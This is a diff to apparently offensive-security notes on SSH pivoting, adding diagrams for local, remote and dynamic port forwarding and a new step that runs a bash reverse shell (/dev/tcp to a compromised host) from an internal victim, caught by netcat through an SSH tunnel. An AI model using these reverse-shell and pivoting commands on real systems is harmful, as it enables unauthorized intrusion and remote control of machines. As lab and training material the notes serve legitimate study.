@@ -18,6 +18,21 @@ Imagine the compromised target (`10.10.10.5`) has a web application running on `
 
 **Syntax:** `ssh -L [local_bind_ip:]<local_port>:<target_ip>:<target_port> user@ssh_server`
 
+```mermaid
+sequenceDiagram
+    participant Attacker as Attacker Browser
+    participant Kali as Kali Linux (Local Port 8080)
+    participant Target as Compromised Host (SSH Server)
+    participant Internal as Internal Web App (Port 80)
+    
+    Attacker->>Kali: http://127.0.0.1:8080
+    Kali->>Target: Encrypted SSH Tunnel
+    Target->>Internal: HTTP GET / (from Target's IP)
+    Internal-->>Target: HTTP 200 OK
+    Target-->>Kali: Encrypted SSH Tunnel
+    Kali-->>Attacker: HTTP 200 OK
+```
+
 ### Example: Forwarding Target's Localhost
 ```bash
 # Binds port 8080 on your Kali box to port 8080 on the target's localhost
@@ -41,6 +56,17 @@ This is highly useful for **catching reverse shells** or hosting a local Python 
 
 **Syntax:** `ssh -R [target_bind_ip:]<target_port>:<local_ip>:<local_port> user@ssh_server`
 
+```mermaid
+sequenceDiagram
+    participant Internal as Internal Victim (10.10.20.5)
+    participant Target as Compromised Host (10.10.10.5:8888)
+    participant Kali as Kali Linux (10.10.14.2:4444)
+    
+    Internal->>Target: Reverse Shell to 10.10.10.5:8888
+    Target->>Kali: Encrypted SSH Tunnel
+    Kali->>Kali: Netcat catches shell on 4444
+```
+
 ### Example: Catching a Reverse Shell
 Your netcat listener is running locally on port `4444`. You want the internal network to send shells to the compromised host (`10.10.10.5`) on port `8888`, which will then forward them to your Kali box.
 
@@ -48,10 +74,17 @@ Your netcat listener is running locally on port `4444`. You want the internal ne
 # Tells the target (10.10.10.5) to listen on port 8888 and forward traffic back to your port 4444
 ssh -R 8888:127.0.0.1:4444 user@10.10.10.5
 ```
+
+**Executing the Payload:**
+On the deep internal victim (`10.10.20.5`), you execute the reverse shell pointing to the compromised host that has the SSH tunnel open:
+```bash
+bash -i >& /dev/tcp/10.10.10.5/8888 0>&1
+```
+
 *Note: The target executes the reverse shell payload connecting to `127.0.0.1:8888` on its own machine, or its internal IP `10.10.10.5:8888` depending on GatewayPorts settings.*
 
-> [!WARNING]
-> **GatewayPorts:** By default, remote port forwarding (`-R`) only binds to `127.0.0.1` on the target. If you want the target to listen on `0.0.0.0` (so *other* internal machines can connect to it), the target's `/etc/ssh/sshd_config` must have `GatewayPorts yes` or `GatewayPorts clientspecified`.
+!!! WARNING
+    **GatewayPorts:** By default, remote port forwarding (`-R`) only binds to `127.0.0.1` on the target. If you want the target to listen on `0.0.0.0` (so *other* internal machines can connect to it), the target's `/etc/ssh/sshd_config` must have `GatewayPorts yes` or `GatewayPorts clientspecified`.
 
 ---
 
@@ -62,6 +95,18 @@ ssh -R 8888:127.0.0.1:4444 user@10.10.10.5
 Instead of forwarding a single port, `-D` creates a local SOCKS4/5 proxy server. You can then use Proxychains or browser proxy settings to send traffic through it.
 
 **Syntax:** `ssh -D [local_bind_ip:]<local_port> user@ssh_server`
+
+```mermaid
+graph LR
+    A[Proxychains/FoxyProxy] -- SOCKS5 --> B[Kali Linux<br>Port 9050]
+    B -- SSH Tunnel --> C[Compromised Host]
+    C -- Dynamic Routing --> D[Any Internal IP/Port]
+    
+    style A fill:#1a1b26,stroke:#7aa2f7,color:#fff
+    style B fill:#1a1b26,stroke:#bb9af7,color:#fff
+    style C fill:#1a1b26,stroke:#f7768e,color:#fff
+    style D fill:#1a1b26,stroke:#9ece6a,color:#fff
+```
 
 ### Example: Creating a SOCKS Proxy
 ```bash
